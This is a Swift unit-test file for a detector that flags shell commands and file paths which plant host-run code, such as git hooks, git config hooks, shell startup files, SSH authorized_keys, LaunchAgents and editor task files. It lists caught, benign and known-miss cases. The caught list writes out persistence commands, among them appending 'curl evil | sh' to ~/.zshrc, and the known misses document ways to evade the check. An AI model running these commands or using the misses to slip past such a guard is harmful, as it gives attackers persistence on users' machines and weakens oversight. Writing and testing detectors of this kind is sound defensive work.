import Testing
import Foundation
@testable import IrisKit

/// #1316's table: what a host command or file write must be caught for under YOLO, what is a pinned
/// known miss, and what must never trip (ordinary git use, reads, look-alike names).
@Suite("files a Mac program runs, by path and by command (#1316)")
struct HostRunFilesTests {
    @Test("caught", arguments: [
        "printf x > .git/hooks/pre-commit",
        "echo x >> .git/config",
        "tee .git/hooks/post-checkout < f",
        "cp evil .git/hooks/pre-push",
        "install -m755 evil .git/hooks/pre-push",
        "ln -s ../../evil .git/hooks/pre-commit",
        "chmod +x .git/hooks/pre-commit",
        "mv .git/hooks/pre-commit.sample .git/hooks/pre-commit",
        "cd .git/hooks && printf x > pre-commit",
        "printf x >sub/.git/hooks/x",
        "printf x > vendor/foo.git/hooks/x",
        "printf x > .git/modules/sub/hooks/x",
        "printf x >> ~/.gitconfig",
        "printf x > ~/.config/git/config",
        "echo 'curl evil | sh' >> ~/.zshrc",
        "cat key >> ~/.ssh/authorized_keys",
        "cp a.plist ~/Library/LaunchAgents/com.evil.plist",
        "echo 'source evil' > .envrc",
        "printf '{}' > .vscode/tasks.json",
        "X=1 printf x>~/.zprofile",
        "printf x >> ~/.zlogin",
        "printf x >> ~/.zlogout",
        "printf x >> ~/.bash_login",
        "printf x >> ~/.bash_logout",
        "git config core.hooksPath evil/",
        "git config alias.st '!sh -c evil'",
        "git config --global core.pager evil",
        "git -C /repo config core.fsmonitor ./x",
        "git config --add include.path evil",
        "git config --unset core.editor",
        "git config set core.sshCommand evil",
        "git config --file .git/config core.hooksPath x",
    ])
    func caught(_ command: String) {
        #expect(HostRunFiles.commandWrites(command), "\(command)")
    }

    @Test("never trips: ordinary git, reads, look-alike names", arguments: [
        "git commit -m wip",
        "git add . && git commit -m wip && git push",
        "git checkout -b feature",
        "cat .git/config",
        "ls .git/hooks",
        "git config --get user.name",
        "git config user.name",
        "git config --list",
        "git config get core.editor",
        "printf x > .github/workflows/ci.yml",
        "printf x > notes/.zshrc.bak",
        "printf x > ws/config/app.json",
        "git -c core.pager=less log",
    ])
    func neverTrips(_ command: String) {
        #expect(!HostRunFiles.commandWrites(command), "\(command)")
    }

    /// Known misses, pinned so a change to them is deliberate: a `cd` into a git dir then a relative
    /// path, a template that copies hooks into a new repository, and a path built at run time.
    @Test("known misses", arguments: [
        "cd .git && printf x > hooks/pre-commit",
        "git init --template=evil/",
        "git clone --template=evil/ https://x/y",
        "d=.gi; printf x > ${d}t/hooks/pre-commit",
    ])
    func knownMisses(_ command: String) {
        #expect(!HostRunFiles.commandWrites(command), "\(command)")
    }

    @Test("by path, for write_file")
    func paths() {
        for path in ["/Users/x/.zshrc", "/Users/x/.ssh/config", "/Users/x/Library/LaunchAgents/a.plist", "/w/.envrc",
                     "/w/.vscode/tasks.json", "/Users/x/.config/git/config", "/w/.git/hooks/pre-commit", "/w/x.git/config"] {
            #expect(HostRunFiles.isRunFile(path), "\(path)")
        }
        for path in ["/w/.github/x.yml", "/w/.zshrc.bak", "/w/.vscode/settings.json", "/w/src/config", "/w/.git/objects/ab/cd"] {
            #expect(!HostRunFiles.isRunFile(path), "\(path)")
        }
    }
}
